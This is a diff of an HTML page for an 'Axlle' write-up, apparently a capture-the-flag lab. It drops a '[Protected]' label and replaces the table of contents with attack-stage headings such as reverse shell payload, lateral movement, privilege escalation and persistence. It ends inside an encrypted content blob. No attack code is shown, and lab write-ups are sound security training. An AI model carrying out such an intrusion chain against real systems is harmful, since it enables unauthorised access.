@@ -20,7 +20,7 @@
     
     
       
-        <title>[Protected] Axlle - xpltive</title>
+        <title>Axlle - xpltive</title>
       
     
     
@@ -46,7 +46,7 @@
       
     
     
-      <link rel="stylesheet" href="../../stylesheets/center.css">
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
     
     <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#enumeration" class="md-skip">
+        <a href="#initial-enumeration" class="md-skip">
           Skip to content
         </a>
       
@@ -128,7 +128,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              [Protected] Axlle
+              Axlle
             
           </span>
         </div>
@@ -542,7 +542,7 @@
           
   
   <span class="md-ellipsis">
-    [Protected] Axlle
+    Axlle
   </span>
   
 
@@ -553,7 +553,7 @@
         
   
   <span class="md-ellipsis">
-    [Protected] Axlle
+    Axlle
   </span>
   
 
@@ -573,85 +573,28 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#enumeration" class="md-nav__link">
+  <a href="#initial-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumeration
+      Initial Enumeration
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Enumeration">
+    <nav class="md-nav" aria-label="Initial Enumeration">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#port-scan" class="md-nav__link">
+  <a href="#nmap-scan" class="md-nav__link">
     <span class="md-ellipsis">
-      Port Scan
+      Nmap Scan
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#information-gathering-on-port-80" class="md-nav__link">
+  <a href="#port-80tcp" class="md-nav__link">
     <span class="md-ellipsis">
-      Information Gathering on Port 80
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Information Gathering on Port 80">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#manual-information-gathering" class="md-nav__link">
-    <span class="md-ellipsis">
-      Manual Information Gathering
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ffuf-enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      FFuF Enumeration
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="FFuF Enumeration">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vhost-scan" class="md-nav__link">
-    <span class="md-ellipsis">
-      VHost Scan
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#directory-scan" class="md-nav__link">
-    <span class="md-ellipsis">
-      Directory Scan
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#information-gathering-on-smtp" class="md-nav__link">
-    <span class="md-ellipsis">
-      Information Gathering on SMTP
+      Port 80/TCP
     </span>
   </a>
   
@@ -673,16 +616,6 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploiting-via-malicious-e-mail-attachment" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exploiting via Malicious E-Mail Attachment
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploiting via Malicious E-Mail Attachment">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#research" class="md-nav__link">
     <span class="md-ellipsis">
       Research
@@ -692,18 +625,28 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#payload" class="md-nav__link">
+  <a href="#payload-creation" class="md-nav__link">
     <span class="md-ellipsis">
-      Payload
+      Payload Creation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Payload Creation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#testing-with-ping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing with Ping
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#exploiting" class="md-nav__link">
+  <a href="#reverse-shell-payload" class="md-nav__link">
     <span class="md-ellipsis">
-      Exploiting
+      Reverse Shell Payload
     </span>
   </a>
   
@@ -720,9 +663,63 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#ad-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      AD Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-exploitation-lateral-movement-to-dallonmatrix" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host Exploitation &amp; Lateral Movement to dallon.matrix
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-exploitation-lateral-movement-to-jacobgreeny" class="md-nav__link">
+    <span class="md-ellipsis">
+      AD Exploitation &amp; Lateral Movement to jacob.greeny
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-enumeration-as-jacobgreeny" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host Enumeration as jacob.greeny
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#privilege-escalation" class="md-nav__link">
     <span class="md-ellipsis">
       Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Persistence
     </span>
   </a>
   
@@ -1142,85 +1139,28 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#enumeration" class="md-nav__link">
+  <a href="#initial-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumeration
+      Initial Enumeration
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Enumeration">
+    <nav class="md-nav" aria-label="Initial Enumeration">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#port-scan" class="md-nav__link">
+  <a href="#nmap-scan" class="md-nav__link">
     <span class="md-ellipsis">
-      Port Scan
+      Nmap Scan
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#information-gathering-on-port-80" class="md-nav__link">
+  <a href="#port-80tcp" class="md-nav__link">
     <span class="md-ellipsis">
-      Information Gathering on Port 80
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Information Gathering on Port 80">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#manual-information-gathering" class="md-nav__link">
-    <span class="md-ellipsis">
-      Manual Information Gathering
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ffuf-enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      FFuF Enumeration
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="FFuF Enumeration">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vhost-scan" class="md-nav__link">
-    <span class="md-ellipsis">
-      VHost Scan
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#directory-scan" class="md-nav__link">
-    <span class="md-ellipsis">
-      Directory Scan
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#information-gathering-on-smtp" class="md-nav__link">
-    <span class="md-ellipsis">
-      Information Gathering on SMTP
+      Port 80/TCP
     </span>
   </a>
   
@@ -1242,16 +1182,6 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploiting-via-malicious-e-mail-attachment" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exploiting via Malicious E-Mail Attachment
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploiting via Malicious E-Mail Attachment">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#research" class="md-nav__link">
     <span class="md-ellipsis">
       Research
@@ -1261,18 +1191,28 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#payload" class="md-nav__link">
+  <a href="#payload-creation" class="md-nav__link">
     <span class="md-ellipsis">
-      Payload
+      Payload Creation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Payload Creation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#testing-with-ping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing with Ping
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#exploiting" class="md-nav__link">
+  <a href="#reverse-shell-payload" class="md-nav__link">
     <span class="md-ellipsis">
-      Exploiting
+      Reverse Shell Payload
     </span>
   </a>
   
@@ -1289,9 +1229,63 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#ad-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      AD Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-exploitation-lateral-movement-to-dallonmatrix" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host Exploitation &amp; Lateral Movement to dallon.matrix
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-exploitation-lateral-movement-to-jacobgreeny" class="md-nav__link">
+    <span class="md-ellipsis">
+      AD Exploitation &amp; Lateral Movement to jacob.greeny
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-enumeration-as-jacobgreeny" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host Enumeration as jacob.greeny
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#privilege-escalation" class="md-nav__link">
     <span class="md-ellipsis">
       Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Persistence
     </span>
   </a>
   
@@ -1312,33 +1306,649 @@
                   
 
 
-<div id="mkdocs-encrypted-content" style="display:none">4K2sayaMwosZJohKWa78fg==;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